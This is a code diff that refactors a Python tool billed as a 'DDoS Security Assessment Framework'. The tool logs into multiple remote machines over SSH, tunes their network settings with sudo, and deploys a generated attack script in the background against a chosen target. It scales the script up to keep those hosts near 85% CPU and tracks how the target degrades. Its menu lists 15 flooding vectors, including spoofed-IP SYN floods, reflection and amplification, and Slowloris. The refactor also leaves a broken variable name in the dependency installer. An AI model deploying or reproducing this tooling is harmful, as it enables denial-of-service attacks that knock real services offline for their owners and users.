@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 
 """
-DDoS Security Assessment Framework v1.0
+DDoS Security Assessment Framework
 
 ✅ All 15 attack vectors with PROVEN techniques from ddos_SIM.py
-✅ Multiprocessing + Threading
+✅ Hybrid: Multiprocessing + Threading
 ✅ Aggressive CPU-adaptive scaling
 ✅ Start: 10x | Target: 80-85% CPU | Max: 60x multiplier
 ✅ Enhanced attack functions with amplification, fragmentation, mirroring
@@ -30,181 +30,170 @@ import signal
 
 GLOBAL_SHUTDOWN = False
 
-def autoInstallDependencies():
-    requiredPackages = {'paramiko': 'paramiko', 'psutil': 'psutil'}
-    for packageName, pipName in requiredPackages.items():
+def auto_install_dependencies():
+    required_packages = {'paramiko': 'paramiko', 'psutil': 'psutil'}
+    for package_name, pip_name in required_packages.items():
         try:
-            __import__(packageName)
+            __import__(package_name)
         except ImportError:
-            subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', pipName], capture_output=True)
+            subprocess.run([sys.executable, '-m', 'pip', 'install', '--break-system-packages', '-q', pipName], capture_output=True)
 
-autoInstallDependencies()
+auto_install_dependencies()
 
 import paramiko
 
 class CentralizedLoggingManager:
-    def __init__(self, mainLogDir: str = "ddos_assessment_logs"):
-        self.mainLogDir = mainLogDir
-        os.makedirs(self.mainLogDir, exist_ok=True)
+    def __init__(self, main_log_dir: str = "ddos_assessment_logs"):
+        self.main_log_dir = main_log_dir
+        os.makedirs(self.main_log_dir, exist_ok=True)
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-        self.runDir = os.path.join(self.mainLogDir, f"run_{timestamp}")
-        self.logsDir = os.path.join(self.runDir, "logs")
-        os.makedirs(self.logsDir, exist_ok=True)
-        self.mainLogger = self._setupLogger("DDoSMain", "00_main.log")
-        print(f"\n[✓] Assessment Run: {self.runDir}\n")
+        self.run_dir = os.path.join(self.main_log_dir, f"run_{timestamp}")
+        self.logs_dir = os.path.join(self.run_dir, "logs")
+        os.makedirs(self.logs_dir, exist_ok=True)
+        self.main_logger = self._setup_logger("DDoSMain", "00_main.log")
+        print(f"\n[✓] Assessment Run: {self.run_dir}\n")
 
-    def _setupLogger(self, name: str, filename: str):
+    def _setup_logger(self, name: str, filename: str):
         logger = logging.getLogger(name)
         logger.setLevel(logging.DEBUG)
         for handler in logger.handlers[:]:
             logger.removeHandler(handler)
-        fileHandler = logging.FileHandler(os.path.join(self.logsDir, filename))
+        fh = logging.FileHandler(os.path.join(self.logs_dir, filename))
         formatter = logging.Formatter('%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
-        fileHandler.setFormatter(formatter)
-        logger.addHandler(fileHandler)
+        fh.setFormatter(formatter)
+        logger.addHandler(fh)
         return logger
 
 class TargetMonitor:
-    def __init__(self, targetIp: str, targetPort: int, timeout: int = 2):
-        self.targetIp = targetIp
-        self.targetPort = targetPort
+    def __init__(self, target_ip: str, target_port: int, timeout: int = 2):
+        self.target_ip = target_ip
+        self.target_port = target_port
         self.timeout = timeout
         self.measurements = []
         self.lock = threading.Lock()
-        self.isMonitoring = False
-        self.baselineResponse = None
+        self.is_monitoring = False
+        self.baseline_response = None
 
-    def pingTargetFast(self) -> Optional[float]:
+    def ping_target_fast(self) -> Optional[float]:
         try:
             start = time.time()
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(self.timeout)
-            sock.connect((self.targetIp, self.targetPort))
+            sock.connect((self.target_ip, self.target_port))
             sock.close()
             return (time.time() - start) * 1000
         except:
             return None
 
-    def establishBaseline(self):
+    def establish_baseline(self):
         print(f"[*] Establishing baseline (10 measurements)...", end=" ", flush=True)
         samples = []
         for _ in range(10):
-            resp = self.pingTargetFast()
+            resp = self.ping_target_fast()
             if resp:
                 samples.append(resp)
             time.sleep(0.5)
         if samples:
-            self.baselineResponse = mean(samples)
-            print(f"✓ Baseline: {self.baselineResponse:.2f}ms")
+            self.baseline_response = mean(samples)
+            print(f"✓ Baseline: {self.baseline_response:.2f}ms")
         else:
             print("✗ Failed")
 
-    def startMonitoring(self):
-        self.isMonitoring = True
-        threading.Thread(target=self._monitorLoop, daemon=True).start()
+    def start_monitoring(self):
+        self.is_monitoring = True
+        threading.Thread(target=self._monitor_loop, daemon=True).start()
 
-    def _monitorLoop(self):
+    def _monitor_loop(self):
         global GLOBAL_SHUTDOWN
-        while self.isMonitoring and not GLOBAL_SHUTDOWN:
+        while self.is_monitoring and not GLOBAL_SHUTDOWN:
             try:
-                responseTime = self.pingTargetFast()
+                response_time = self.ping_target_fast()
                 with self.lock:
                     self.measurements.append({
                         "time": datetime.now().isoformat(),
-                        "responseMs": responseTime
+                        "response_ms": response_time
                     })
                 time.sleep(1)
             except:
                 time.sleep(1)
 
-    def getCurrentResponseAndTimeouts(self) -> Tuple[Optional[float], int, int]:
+    def get_current_response_and_timeouts(self) -> Tuple[Optional[float], int, int]:
         with self.lock:
             total = len(self.measurements)
             if total == 0:
                 return None, 0, 0
+            last = self.measurements[-1]["response_ms"]
+            timeouts = len([m for m in self.measurements if m["response_ms"] is None])
+            return last, timeouts, total
 
-            last = self.measurements[-1]["responseMs"]
-            previous = self.measurements[:-1]
-            prevTotal = len(previous)
-            prevTimeouts = len([m for m in previous if m["responseMs"] is None])
-
-            if last is None:
-                timeouts = prevTimeouts + 1
-                totalChecks = prevTotal + 1
-            else:
-                timeouts = prevTimeouts
-                totalChecks = prevTotal + 1
-
-            return last, timeouts, totalChecks
-
-    def getStatistics(self) -> Dict:
+    def get_statistics(self) -> Dict:
         with self.lock:
             if not self.measurements:
                 return {
                     "total": 0,
                     "timeouts": 0,
-                    "timeoutPct": 0.0,
-                    "avgResponse": None,
-                    "maxResponse": None,
-                    "minResponse": None,
-                    "baseline": self.baselineResponse,
-                    "degradationPct": 0.0
+                    "timeout_pct": 0.0,
+                    "avg_response": None,
+                    "max_response": None,
+                    "min_response": None,
+                    "baseline": self.baseline_response,
+                    "degradation_pct": 0.0
                 }
             total = len(self.measurements)
-            timeouts = len([m for m in self.measurements if m["responseMs"] is None])
-            successful = [m["responseMs"] for m in self.measurements if m["responseMs"] is not None]
-            avgResp = mean(successful) if successful else None
+            timeouts = len([m for m in self.measurements if m["response_ms"] is None])
+            successful = [m["response_ms"] for m in self.measurements if m["response_ms"] is not None]
+            avg_resp = mean(successful) if successful else None
             degradation = 0.0
-            if avgResp and self.baselineResponse:
-                degradation = ((avgResp - self.baselineResponse) / self.baselineResponse) * 100
+            if avg_resp and self.baseline_response:
+                degradation = ((avg_resp - self.baseline_response) / self.baseline_response) * 100
             return {
                 "total": total,
                 "timeouts": timeouts,
-                "timeoutPct": (timeouts / total * 100) if total > 0 else 0.0,
-                "avgResponse": avgResp,
-                "maxResponse": max(successful) if successful else None,
-                "minResponse": min(successful) if successful else None,
-                "baseline": self.baselineResponse,
-                "degradationPct": degradation
+                "timeout_pct": (timeouts / total * 100) if total > 0 else 0.0,
+                "avg_response": avg_resp,
+                "max_response": max(successful) if successful else None,
+                "min_response": min(successful) if successful else None,
+                "baseline": self.baseline_response,
+                "degradation_pct": degradation
             }
 
-    def stopMonitoring(self):
-        self.isMonitoring = False
+    def stop_monitoring(self):
+        self.is_monitoring = False
 
 class SingleLineDisplayThread(threading.Thread):
-    def __init__(self, targetMonitor: TargetMonitor, sshInstances: List, duration: int = 120):
+    def __init__(self, target_monitor: TargetMonitor, ssh_instances: List, duration: int = 120):
         super().__init__(daemon=True)
-        self.targetMonitor = targetMonitor
-        self.sshInstances = sshInstances
+        self.target_monitor = target_monitor
+        self.ssh_instances = ssh_instances
         self.duration = duration
         self.running = True
 
     def run(self):
         global GLOBAL_SHUTDOWN
-        startTime = time.time()
-        while self.running and (time.time() - startTime) < self.duration and not GLOBAL_SHUTDOWN:
+        start_time = time.time()
+        while self.running and (time.time() - start_time) < self.duration and not GLOBAL_SHUTDOWN:
             try:
-                elapsed = time.time() - startTime
-                resp, timeouts, totalChecks = self.targetMonitor.getCurrentResponseAndTimeouts()
-                respStr = f"{resp:.2f}ms" if resp is not None else "TIMEOUT"
+                elapsed = time.time() - start_time
+                resp, timeouts, total_checks = self.target_monitor.get_current_response_and_timeouts()
+                resp_str = f"{resp:.2f}ms" if resp is not None else "TIMEOUT"
                 status = "✓" if resp is not None else "✗"
 
-                totalBandwidth = 0.0
-                totalThreads = 0
-                for inst in self.sshInstances:
-                    metrics = inst.getCurrentMetrics()
-                    totalBandwidth += metrics.get('bandwidthMbps', 0.0)
-                    totalThreads += metrics.get('threads', 0)
+                total_bw = 0.0
+                total_threads = 0
+                for inst in self.ssh_instances:
+                    metrics = inst.get_current_metrics()
+                    total_bw += metrics.get('bandwidth_mbps', 0.0)
+                    total_threads += metrics.get('threads', 0)
 
-                instancesWorking = len(self.sshInstances)
+                instances_working = len(self.ssh_instances)
 
                 print(
                     f"[{elapsed:5.1f}s] [{status}] "
-                    f"Resp: {respStr:9s} | "
-                    f"Timeouts: {timeouts}/{totalChecks} | "
-                    f"InstancesWorking: {instancesWorking} | "
-                    f"Bandwidth: {totalBandwidth:8.2f} Mbps | "
-                    f"Threads: {totalThreads}"
+                    f"Resp: {resp_str:9s} | "
+                    f"Timeouts: {timeouts}/{total_checks} | "
+                    f"Inst: {instances_working} | "
+                    f"BW: {total_bw:8.2f} Mbps | "
+                    f"Thr: {total_threads}"
                 )
                 time.sleep(1)
             except:
@@ -215,7 +204,7 @@ class SingleLineDisplayThread(threading.Thread):
 
 class SSHInstance:
     def __init__(self, ip: str, username: str, password: str, port: int = 22,
-                 instanceLogger=None, targetMinCpu: float = 80.0, targetMaxCpu: float = 85.0):
+                 instance_logger=None, target_min_cpu: float = 80.0, target_max_cpu: float = 85.0):
         self.ip = ip
         self.username = username
         self.password = password
@@ -223,28 +212,28 @@ class SSHInstance:
         self.client = None
         self.connected = False
         self.lock = threading.Lock()
-        self.instanceLogger = instanceLogger
-        self.targetMinCpu = targetMinCpu
-        self.targetMaxCpu = targetMaxCpu
-        self.currentCpu = 0.0
-        self.currentMemory = 0.0
-        self.currentBandwidth = 0.0
-        self.currentThreads = 0
-        self.remoteCores = 0
-        self.currentMultiplier = 10.0
-        self.threadsPerProcess = 50
-        self.isMonitoring = False
-        self.targetIp = None
-        self.targetPort = None
+        self.instance_logger = instance_logger
+        self.target_min_cpu = target_min_cpu
+        self.target_max_cpu = target_max_cpu
+        self.current_cpu = 0.0
+        self.current_memory = 0.0
+        self.current_bandwidth = 0.0
+        self.current_threads = 0
+        self.remote_cores = 0
+        self.current_multiplier = 10.0
+        self.threads_per_process = 50
+        self.is_monitoring = False
+        self.target_ip = None
+        self.target_port = None
         self.duration = 0
-        self.attackName = ""
+        self.attack_name = ""
 
     def log(self, message: str, level: str = "info"):
-        if self.instanceLogger:
+        if self.instance_logger:
             if level == "error":
-                self.instanceLogger.error(message)
+                self.instance_logger.error(message)
             else:
-                self.instanceLogger.info(message)
+                self.instance_logger.info(message)
 
     def connect(self) -> bool:
         try:
@@ -260,152 +249,142 @@ class SSHInstance:
                 allow_agent=False
             )
             self.connected = True
-            output, _, _ = self.executeCommand("nproc")
+            output, _, _ = self.execute_command("nproc")
             try:
-                self.remoteCores = int(output.strip())
+                self.remote_cores = int(output.strip())
             except:
-                self.remoteCores = 4
-            self.log(f"Connected (Cores: {self.remoteCores})")
+                self.remote_cores = 4
+            self.log(f"Connected (Cores: {self.remote_cores})")
             return True
-        except Exception as error:
+        except Exception as e:
             self.connected = False
-            self.log(f"Connection failed: {str(error)}", level="error")
+            self.log(f"Connection failed: {str(e)}", level="error")
             return False
 
-    def executeCommand(self, command: str, timeout: int = 10) -> Tuple[str, str, int]:
+    def execute_command(self, command: str, timeout: int = 10) -> Tuple[str, str, int]:
         if not self.connected or not self.client:
             return "", "Not connected", -1
         try:
             stdin, stdout, stderr = self.client.exec_command(command, timeout=timeout)
             output = stdout.read().decode('utf-8', errors='ignore')
             error = stderr.read().decode('utf-8', errors='ignore')
-            returnCode = stdout.channel.recv_exit_status()
-            return output, error, returnCode
-        except Exception as error:
-            return "", str(error), -1
+            return_code = stdout.channel.recv_exit_status()
+            return output, error, return_code
+        except Exception as e:
+            return "", str(e), -1
 
-    def getRemoteMetrics(self) -> Dict:
+    def get_remote_metrics(self) -> Dict:
         try:
-            cmdCpu = "top -bn2 -d 0.5 | grep 'Cpu(s)' | tail -1 | awk '{print $2}' | cut -d'%' -f1"
-            output, _, _ = self.executeCommand(cmdCpu, timeout=3)
+            cmd_cpu = "top -bn2 -d 0.5 | grep 'Cpu(s)' | tail -1 | awk '{print $2}' | cut -d'%' -f1"
+            output, _, _ = self.execute_command(cmd_cpu, timeout=3)
             cpu = float(output.strip().replace(',', '.')) if output.strip() else 0.0
 
-            cmdMem = "free | grep Mem | awk '{print ($3/$2) * 100.0}'"
-            output, _, _ = self.executeCommand(cmdMem, timeout=3)
+            cmd_mem = "free | grep Mem | awk '{print ($3/$2) * 100.0}'"
+            output, _, _ = self.execute_command(cmd_mem, timeout=3)
             memory = float(output.strip()) if output.strip() else 0.0
 
-            cmdThreads = "ps -eLf | grep 'python3.*attack' | grep -v grep | wc -l"
-            output, _, _ = self.executeCommand(cmdThreads, timeout=3)
+            cmd_threads = "ps -eLf | grep 'python3.*attack' | grep -v grep | wc -l"
+            output, _, _ = self.execute_command(cmd_threads, timeout=3)
             threads = int(output.strip()) if output.strip() else 0
 
-            cmdBandwidth = "cat /proc/net/dev | grep -E 'eth0|ens' | head -1 | awk '{print $10}'"
-            output, _, _ = self.executeCommand(cmdBandwidth, timeout=3)
-            bytesSent = int(output.strip()) if output.strip() and output.strip().isdigit() else 0
-            bandwidth = bytesSent / (1024 * 1024)
+            cmd_bw = "cat /proc/net/dev | grep -E 'eth0|ens' | head -1 | awk '{print $10}'"
+            output, _, _ = self.execute_command(cmd_bw, timeout=3)
+            bytes_sent = int(output.strip()) if output.strip() and output.strip().isdigit() else 0
+            bandwidth = bytes_sent / (1024 * 1024)
 
-            return {
-                "cpu": cpu,
-                "memory": memory,
-                "bandwidthMbps": bandwidth,
-                "threads": threads
-            }
+            return {"cpu": cpu, "memory": memory, "bandwidth_mbps": bandwidth, "threads": threads}
         except:
-            return {
-                "cpu": 0,
-                "memory": 0,
-                "bandwidthMbps": 0,
-                "threads": 0
-            }
+            return {"cpu": 0, "memory": 0, "bandwidth_mbps": 0, "threads": 0}
 
-    def adjustThreads(self):
+    def adjust_threads(self):
         global GLOBAL_SHUTDOWN
         if GLOBAL_SHUTDOWN:
             return
 
-        metrics = self.getRemoteMetrics()
+        metrics = self.get_remote_metrics()
         cpu = metrics['cpu']
-        self.currentCpu = cpu
-        self.currentMemory = metrics['memory']
-        self.currentBandwidth = metrics['bandwidthMbps']
-        self.currentThreads = metrics['threads']
+        self.current_cpu = cpu
+        self.current_memory = metrics['memory']
+        self.current_bandwidth = metrics['bandwidth_mbps']
+        self.current_threads = metrics['threads']
 
-        oldMultiplier = self.currentMultiplier
+        old_mult = self.current_multiplier
 
         if cpu < 40:
-            self.currentMultiplier = min(self.currentMultiplier * 2.5, 60.0)
+            self.current_multiplier = min(self.current_multiplier * 2.5, 60.0)
         elif cpu < 50:
-            self.currentMultiplier = min(self.currentMultiplier * 2.0, 60.0)
+            self.current_multiplier = min(self.current_multiplier * 2.0, 60.0)
         elif cpu < 60:
-            self.currentMultiplier = min(self.currentMultiplier * 1.50, 60.0)
+            self.current_multiplier = min(self.current_multiplier * 1.50, 60.0)
         elif cpu < 70:
-            self.currentMultiplier = min(self.currentMultiplier * 1.30, 60.0)
+            self.current_multiplier = min(self.current_multiplier * 1.30, 60.0)
         elif 70 <= cpu < 75:
-            self.currentMultiplier = min(self.currentMultiplier * 1.15, 60.0)
-        elif 75 <= cpu < self.targetMinCpu:
-            self.currentMultiplier = min(self.currentMultiplier * 1.08, 60.0)
-        elif self.targetMinCpu <= cpu <= self.targetMaxCpu:
+            self.current_multiplier = min(self.current_multiplier * 1.15, 60.0)
+        elif 75 <= cpu < self.target_min_cpu:
+            self.current_multiplier = min(self.current_multiplier * 1.08, 60.0)
+        elif self.target_min_cpu <= cpu <= self.target_max_cpu:
             pass
-        elif self.targetMaxCpu < cpu <= 90:
-            self.currentMultiplier = max(self.currentMultiplier * 0.92, 1.0)
+        elif self.target_max_cpu < cpu <= 90:
+            self.current_multiplier = max(self.current_multiplier * 0.92, 1.0)
         else:
-            self.currentMultiplier = max(self.currentMultiplier * 0.75, 1.0)
+            self.current_multiplier = max(self.current_multiplier * 0.75, 1.0)
 
-        if abs(self.currentMultiplier - oldMultiplier) > 0.5:
-            totalWorkers = int(self.remoteCores * self.currentMultiplier * self.threadsPerProcess)
+        if abs(self.current_multiplier - old_mult) > 0.5:
+            total_workers = int(self.remote_cores * self.current_multiplier * self.threads_per_process)
             self.log(
-                f"Cpu: {cpu:.1f}% | Multiplier: {oldMultiplier:.2f}→{self.currentMultiplier:.2f} | "
-                f"Workers: {totalWorkers} ({self.remoteCores}×{self.threadsPerProcess})"
+                f"CPU: {cpu:.1f}% | Mult: {old_mult:.2f}→{self.current_multiplier:.2f} | "
+                f"Workers: {total_workers} ({self.remote_cores}×{self.threads_per_process})"
             )
-            self._redeployAttack()
+            self._redeploy_attack()
 
-    def _redeployAttack(self):
+    def _redeploy_attack(self):
         try:
-            self.executeCommand("pkill -9 -f 'python3.*attack' 2>/dev/null", timeout=5)
+            self.execute_command("pkill -9 -f 'python3.*attack' 2>/dev/null", timeout=5)
             time.sleep(0.2)
-            self.executeCommand(
-                f"nohup python3 /tmp/attack.py {self.targetIp} {self.targetPort} "
-                f"{self.duration} {int(self.currentMultiplier)} >/dev/null 2>&1 &",
+            self.execute_command(
+                f"nohup python3 /tmp/attack.py {self.target_ip} {self.target_port} "
+                f"{self.duration} {int(self.current_multiplier)} >/dev/null 2>&1 &",
                 timeout=5
             )
-        except Exception as error:
-            self.log(f"Redeploy failed: {str(error)}", level="error")
+        except Exception as e:
+            self.log(f"Redeploy failed: {str(e)}", level="error")
 
-    def startMonitoring(self):
-        self.isMonitoring = True
-        threading.Thread(target=self._monitoringLoop, daemon=True).start()
+    def start_monitoring(self):
+        self.is_monitoring = True
+        threading.Thread(target=self._monitoring_loop, daemon=True).start()
 
-    def _monitoringLoop(self):
+    def _monitoring_loop(self):
         global GLOBAL_SHUTDOWN
-        while self.isMonitoring and not GLOBAL_SHUTDOWN:
+        while self.is_monitoring and not GLOBAL_SHUTDOWN:
             try:
-                self.adjustThreads()
+                self.adjust_threads()
                 for _ in range(30):
-                    if GLOBAL_SHUTDOWN or not self.isMonitoring:
+                    if GLOBAL_SHUTDOWN or not self.is_monitoring:
                         break
                     time.sleep(0.1)
             except:
                 time.sleep(3)
 
-    def stopMonitoring(self):
-        self.isMonitoring = False
+    def stop_monitoring(self):
+        self.is_monitoring = False
 
-    def getCurrentMetrics(self) -> Dict:
+    def get_current_metrics(self) -> Dict:
         return {
-            "cpu": self.currentCpu,
-            "memory": self.currentMemory,
-            "bandwidthMbps": self.currentBandwidth,
-            "threads": self.currentThreads,
-            "multiplier": self.currentMultiplier
+            "cpu": self.current_cpu,
+            "memory": self.current_memory,
+            "bandwidth_mbps": self.current_bandwidth,
+            "threads": self.current_threads,
+            "multiplier": self.current_multiplier
         }
 
-    def executeAttack(self, targetIp: str, targetPort: int, attackName: str, duration: int = 120) -> bool:
+    def execute_attack(self, target_ip: str, target_port: int, attack_name: str, duration: int = 120) -> bool:
         try:
-            self.targetIp = targetIp
-            self.targetPort = targetPort
+            self.target_ip = target_ip
+            self.target_port = target_port
             self.duration = duration
-            self.attackName = attackName
+            self.attack_name = attack_name
 
-            optimizeCmd = """sudo bash -c '
+            optimize_cmd = """sudo bash -c '
 sysctl -w net.core.rmem_default=26214400 2>/dev/null
 sysctl -w net.core.wmem_default=26214400 2>/dev/null
 sysctl -w net.ipv4.tcp_max_syn_backlog=65535 2>/dev/null
@@ -415,46 +394,46 @@ sysctl -w net.ipv4.tcp_tw_reuse=1 2>/dev/null
 sysctl -w net.ipv4.tcp_fin_timeout=10 2>/dev/null
 ulimit -n 999999 2>/dev/null
 ' 2>/dev/null"""
-            self.executeCommand(optimizeCmd, timeout=30)
+            self.execute_command(optimize_cmd, timeout=30)
 
-            attackScript = self._generateEnhancedAttackScript(targetIp, targetPort, attackName, duration)
-            self.executeCommand(
-                f"cat > /tmp/attack.py << 'EOFSCRIPT'\n{attackScript}\nEOFSCRIPT",
+            attack_script = self._generate_enhanced_attack_script(target_ip, target_port, attack_name, duration)
+            self.execute_command(
+                f"cat > /tmp/attack.py << 'EOFSCRIPT'\n{attack_script}\nEOFSCRIPT",
                 timeout=10
             )
-            self.executeCommand(
-                f"nohup python3 /tmp/attack.py {self.targetIp} {self.targetPort} "
-                f"{self.duration} {int(self.currentMultiplier)} >/dev/null 2>&1 &",
+            self.execute_command(
+                f"nohup python3 /tmp/attack.py {self.target_ip} {self.target_port} "
+                f"{self.duration} {int(self.current_multiplier)} >/dev/null 2>&1 &",
                 timeout=5
             )
 
-            totalWorkers = int(self.remoteCores * self.currentMultiplier * self.threadsPerProcess)
-            self.currentThreads = totalWorkers
+            total_workers = int(self.remote_cores * self.current_multiplier * self.threads_per_process)
+            self.current_threads = total_workers
             self.log(
-                f"✓ {self.attackName} deployed ({self.remoteCores} procs × {self.threadsPerProcess} "
-                f"threads × {self.currentMultiplier:.1f}x = {totalWorkers} workers)"
+                f"✓ {self.attack_name} deployed ({self.remote_cores} procs × {self.threads_per_process} "
+                f"threads × {self.current_multiplier:.1f}x = {total_workers} workers)"
             )
-            self.startMonitoring()
+            self.start_monitoring()
             return True
-        except Exception as error:
-            self.log(f"Deploy failed: {str(error)}", level="error")
+        except Exception as e:
+            self.log(f"Deploy failed: {str(e)}", level="error")
             return False
 
-    def _generateEnhancedAttackScript(self, targetIp: str, targetPort: int, attackName: str, duration: int) -> str:
+    def _generate_enhanced_attack_script(self, target_ip: str, target_port: int, attack_name: str, duration: int) -> str:
         base = f'''#!/usr/bin/env python3
 
 import socket,struct,random,time,sys,threading
 from multiprocessing import Process,cpu_count
 
-target_ip=sys.argv[1] if len(sys.argv)>1 else '{targetIp}'
-target_port=int(sys.argv[2]) if len(sys.argv)>2 else {targetPort}
+target_ip=sys.argv[1] if len(sys.argv)>1 else '{target_ip}'
+target_port=int(sys.argv[2]) if len(sys.argv)>2 else {target_port}
 duration=int(sys.argv[3]) if len(sys.argv)>3 else {duration}
 multiplier=float(sys.argv[4]) if len(sys.argv)>4 else 10.0
 cores=cpu_count()
-THREADS_PER_PROCESS={self.threadsPerProcess}
+THREADS_PER_PROCESS={self.threads_per_process}
 
 '''
-        logicMap = {
+        logic_map = {
             "SYN Flood": '''def attack_worker():
     try:
         sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
@@ -758,8 +737,8 @@ THREADS_PER_PROCESS={self.threadsPerProcess}
 '''
         }
 
-        key = attackName.split(' - ')[0]
-        body = logicMap.get(key, "def attack_worker():\n    pass\n\n")
+        key = attack_name.split(' - ')[0]
+        body = logic_map.get(key, "def attack_worker():\n    pass\n\n")
 
         controller = '''
 def run_worker():
@@ -789,11 +768,11 @@ if __name__ == "__main__":
 '''
         return base + body + controller
 
-    def installPrerequisites(self) -> bool:
+    def install_prerequisites(self) -> bool:
         try:
             self.log("Installing prerequisites...")
-            self.executeCommand("sudo apt-get update -qq 2>&1|tail -1", timeout=300)
-            self.executeCommand("sudo apt-get install -y python3 -qq 2>&1", timeout=300)
+            self.execute_command("sudo apt-get update -qq 2>&1|tail -1", timeout=300)
+            self.execute_command("sudo apt-get install -y python3 -qq 2>&1", timeout=300)
             self.log("✓ Prerequisites installed")
             return True
         except:
@@ -801,8 +780,8 @@ if __name__ == "__main__":
 
     def disconnect(self):
         try:
-            self.stopMonitoring()
-            self.executeCommand("pkill -9 -f 'python3.*attack' 2>/dev/null", timeout=5)
+            self.stop_monitoring()
+            self.execute_command("pkill -9 -f 'python3.*attack' 2>/dev/null", timeout=5)
             if self.client:
                 self.client.close()
             self.connected = False
@@ -811,208 +790,208 @@ if __name__ == "__main__":
             pass
 
 AVAILABLE_ATTACKS = [
-    "SYN Flood - Raw TCP SYN with 1000 spoofed IPs + Threading",
-    "SYN Mirroring - SYN packets from target IP itself + Threading",
-    "SYN+ACK Flood - Invalid SYN+ACK combination + Threading",
-    "SYN Reflection - Third-party amplification + Threading",
-    "FIN+ACK Flood - Connection teardown flood + Threading",
-    "TCP Fragmentation - Fragmented packets (offset=8192) + Threading",
-    "UDP Reflective Amplification - DNS query flood + Threading",
-    "ICMP Ping of Death - Oversized ICMP (65KB) + Threading",
-    "Connection Buffer Exhaustion - 500 connections/thread + Threading",
-    "TCP Amplification - 30x burst per spoofed IP + Threading",
-    "Request Exaggeration - 25KB HTTP headers + Threading",
-    "Response Read Delay - Slowloris partial headers + Threading",
-    "Slow Read - 1 byte reads + Threading",
-    "Read Range - 500 byte ranges/request + Threading",
-    "Request Flood - 100 pipelined requests/connection + Threading"
+    "SYN Flood - Raw TCP SYN with 1000 spoofed IPs + Hybrid Threading",
+    "SYN Mirroring - SYN packets from target IP itself + Hybrid Threading",
+    "SYN+ACK Flood - Invalid SYN+ACK combination + Hybrid Threading",
+    "SYN Reflection - Third-party amplification + Hybrid Threading",
+    "FIN+ACK Flood - Connection teardown flood + Hybrid Threading",
+    "TCP Fragmentation - Fragmented packets (offset=8192) + Hybrid Threading",
+    "UDP Reflective Amplification - DNS query flood + Hybrid Threading",
+    "ICMP Ping of Death - Oversized ICMP (65KB) + Hybrid Threading",
+    "Connection Buffer Exhaustion - 500 connections/thread + Hybrid Threading",
+    "TCP Amplification - 30x burst per spoofed IP + Hybrid Threading",
+    "Request Exaggeration - 25KB HTTP headers + Hybrid Threading",
+    "Response Read Delay - Slowloris partial headers + Hybrid Threading",
+    "Slow Read - 1 byte reads + Hybrid Threading",
+    "Read Range - 500 byte ranges/request + Hybrid Threading",
+    "Request Flood - 100 pipelined requests/connection + Hybrid Threading"
 ]
 
-def displayAttackMenu(attacks: List[str]) -> List[str]:
-    print("\n" + "=" * 150)
-    print("DDoS Security Assessment Framework v1.0 - All 15 Vectors")
-    print("✓ Multiprocessing + Threading (50 threads per process)")
+def display_attack_menu(attacks: List[str]) -> List[str]:
+    print("\n"+"="*150)
+    print("HYBRID DDoS ASSESSMENT - ALL 15 VECTORS")
+    print("✓ Hybrid: Multiprocessing + Threading (50 threads per process)")
     print("✓ Start: 10x mult | ✓ Max: 60x (4800 threads) | ✓ Target: 80-85% CPU | ✓ Verdict analysis")
-    print("=" * 150 + "\n")
-    print("[AttackVectors]\n")
-    for index, attack in enumerate(attacks, 1):
-        print(f" {index:2d}. {attack}")
-    print(f"\n {len(attacks) + 1:2d}. All Attack Vectors")
+    print("="*150+"\n")
+    print("[ATTACK VECTORS]\n")
+    for idx, attack in enumerate(attacks, 1):
+        print(f" {idx:2d}. {attack}")
+    print(f"\n {len(attacks)+1:2d}. All Attack Vectors")
     choice = input("\nSelect (number): ").strip()
     try:
-        choiceNumber = int(choice)
-        if choiceNumber == len(attacks) + 1:
+        choice_num = int(choice)
+        if choice_num == len(attacks) + 1:
             return attacks
-        elif 1 <= choiceNumber <= len(attacks):
-            return [attacks[choiceNumber - 1]]
+        elif 1 <= choice_num <= len(attacks):
+            return [attacks[choice_num - 1]]
     except:
         pass
     return attacks
 
 class DDoSAssessmentFramework:
-    def __init__(self, sshInstances: List[SSHInstance], targetIp: str, targetPort: int,
-                 logger: CentralizedLoggingManager, selectedAttacks: List[str], duration: int = 120):
-        self.sshInstances = sshInstances
-        self.targetIp = targetIp
-        self.targetPort = targetPort
+    def __init__(self, ssh_instances: List[SSHInstance], target_ip: str, target_port: int,
+                 logger: CentralizedLoggingManager, selected_attacks: List[str], duration: int = 120):
+        self.ssh_instances = ssh_instances
+        self.target_ip = target_ip
+        self.target_port = target_port
         self.logger = logger
-        self.selectedAttacks = selectedAttacks
+        self.selected_attacks = selected_attacks
         self.duration = duration
         self.running = True
         self.results = []
-        signal.signal(signal.SIGINT, self._signalHandler)
+        signal.signal(signal.SIGINT, self._signal_handler)
 
-    def _signalHandler(self, sig, frame):
+    def _signal_handler(self, sig, frame):
         global GLOBAL_SHUTDOWN
         GLOBAL_SHUTDOWN = True
         self.running = False
-        print(f"\n\n{'=' * 150}\n[!] CtrlC - Stopping\n{'=' * 150}\n")
+        print(f"\n\n{'='*150}\n[!] CTRL+C - STOPPING\n{'='*150}\n")
         threading.Timer(2.0, lambda: os._exit(0)).start()
 
-    def setupInstances(self) -> List[SSHInstance]:
-        print("=" * 150)
-        print("Phase1: Setup")
-        print("=" * 150 + "\n")
+    def setup_instances(self) -> List[SSHInstance]:
+        print("="*150)
+        print("PHASE 1: SETUP")
+        print("="*150+"\n")
         connected = []
-        for inst in self.sshInstances:
+        for inst in self.ssh_instances:
             if GLOBAL_SHUTDOWN:
                 break
             print(f"[*] {inst.ip}...", end=" ", flush=True)
             if inst.connect():
                 print("✓ Connected", end=" | ", flush=True)
-                if inst.installPrerequisites():
+                if inst.install_prerequisites():
                     print("✓ Ready")
                     connected.append(inst)
                 else:
                     print("✗ Install failed")
             else:
                 print("✗ Connection failed")
-        print(f"\n[✓] Ready: {len(connected)}/{len(self.sshInstances)}\n")
+        print(f"\n[✓] Ready: {len(connected)}/{len(self.ssh_instances)}\n")
         return connected
 
-    def runAssessment(self, instances: List[SSHInstance]):
+    def run_assessment(self, instances: List[SSHInstance]):
         global GLOBAL_SHUTDOWN
-        targetMonitor = TargetMonitor(self.targetIp, self.targetPort, timeout=2)
-        targetMonitor.establishBaseline()
+        target_monitor = TargetMonitor(self.target_ip, self.target_port, timeout=2)
